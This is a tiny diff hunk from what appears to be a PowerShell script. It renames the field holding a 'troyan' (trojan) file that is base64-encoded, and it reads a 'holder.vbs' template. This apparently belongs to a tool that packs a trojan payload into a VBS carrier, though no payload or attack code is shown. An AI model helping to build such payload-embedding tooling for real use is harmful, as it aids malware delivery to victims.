@@ -99,7 +99,7 @@ function Create-EmbeddingFiles {
 }
 
 
-$body = Encode-FileToBase64 -inFile $server.troyanScript
+$body = Encode-FileToBase64 -inFile $server.troyanBody
 
 $holder = Get-Content -Path (Join-Path -Path $scriptDir -ChildPath "holder.vbs")
 
